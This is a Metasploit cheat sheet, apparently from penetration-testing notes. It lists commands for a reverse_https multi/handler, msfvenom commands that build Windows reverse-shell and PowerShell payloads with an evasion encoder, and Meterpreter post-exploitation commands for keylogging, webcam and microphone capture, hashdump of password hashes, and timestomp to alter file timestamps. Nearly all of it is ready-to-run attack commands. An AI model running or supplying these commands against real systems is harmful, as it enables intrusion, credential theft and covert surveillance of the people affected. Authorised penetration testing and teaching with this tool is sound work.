---
title: Metasploit
category: Exploitation
order: 2
---

> **Useage** 

Example rc file | <code> use exploit/multi/handler <br> set PAYLOAD windows/meterpreter/reverse_https <br> set LHOST 10.10.75.1 <br> set LPORT 8443 <br> set ExitOnSession false <br> exploit -j </code>
Run an rc file | <code> Resource [location of RC file] </code>
location | <code> /opt/metasploit-4.11/ or /usr/share/framework2/ </code>
Exploit Location | <code> [location]/apps/pro/msf3/modules/exploits/ </code>
Payload Location | <code> [location]/apps/pro/msf3/modules/payloads </code>
run | <code> ./app/msfconssole </code>
Show Exploits | <code> show exploits </code>
Find Exploits | <code> search multi/handler or search android </code>
Info about Exploits | <code> info exploit/multi/handler </code>
Use Exploit | <code> use exploit/multi/handler </code>
Show Payloads | <code> show payloads </code>
Set Payload | <code> set PAYLOAD windows/shell/reverse_tcp </code>
Show Options on Payload | <code> show options </code>
Set Remote Hosts | <code> set RHOST 10.10.77.1 </code>
Set Local Hosts | <code> set LHOST 10.10.75.1 </code>
Exit on Session | <code> set ExitOnSession false </code>
Exploit as Job | <code> exploit -j </code>
list running jobs | <code> jobs </code>
List sessions | <code> sessions -l </code>
Interact with session | <code> session -i [n] </code>
Background a shell | <code> CTRL-Z </code>
Kill sessions  | <code> sessions -K </code>
Add a route | <code> route add [victim2 subnet] [netmask] [sid] </code> 
Errno:ECONNECT RESET | Reason: Windows Antivirus on client

> **Useage** 

Commands | db_connect, db_disconnect, db_driver, db_status, db_export
Data | hosts, vulns, services, creds, loot, notes
Populate Hosts/Ports | use auxiliary/scanner/protscan/[tcp or syn] <br> use auxiliary/discovery/udp_sweep <br> db_nmap


Manually | hosts --add/--delete [host]<br>
services --add/--delete -p [port] -r [proto] -s [name] [host1, host2,...] <br>
notes --add/--delete -r [type] -n '[note text]' [host1, host2,...]
Import | db_import Nmap XML (-oX option) Nessus XMLv2 or XMLv2 (.nessus)
Hosts Help and Search | hosts -h <br>
host -S linux -R (adds to RHOST)
Vulnearabilities | vulns -h <br>
vulns -S RPC <br>
vulns -P 445

> **MSFVenom**

Example | <code> msfvenom -p windows/shell/reverse_tcp LHOST=10.10.75.1 LPORT=8080 -f exe > /tmp/file.exe </code>
Powershell Reflection | <code> msfvenom -p windows/meterpreter/reverse_https lhost=[attacker] lport=[attackerport] -f psh-reflection -a x86 > output.txt </code> 
Powershell Command | <code> msfvenom –a x86 –platform windows –p windows/meterpreter/reverse_https LHOST=[attackerIP] LPORT=[attackerPort] -e x86/shikata_ga_nai –f psh-cmd </code> 
Help | msfvenom --help-formats

> **Meterpreter**

Get system info | sysinfo
Read Registry | reg
Change local directory | lcd
Download and Upload | download/upload
Make/Remove Directory | mkdir/rmdir
Edit a file | edit
Get the PID | getpid
Get the users ID | getuid
process list | ps
Drop to Command Prompt | Shell
Terminate Program | kill [pid]
Run a program | execute [program]
Change process | migrate [PID]
Display Routing Table | route
TCP relay | portfwd add -l 1111 -p 80 -r Target 2
Screen Shot | screenshot -p [filename.jpg]
List Webcams and take a picture | webcam_list, webcam_snap
Record Microphone | record_mic -d [Seconds]
Keylogger | keyscan_start, keyscan_stop, keyscan_dump
modules | data/meterpreter/
Load Module | use [last component of dll name]
priv modules | hashdump (SAM database), timestomp (MACE dates/times)
Port Scanner | meterpreter > load msfmap <br> meterpreter > msfmap







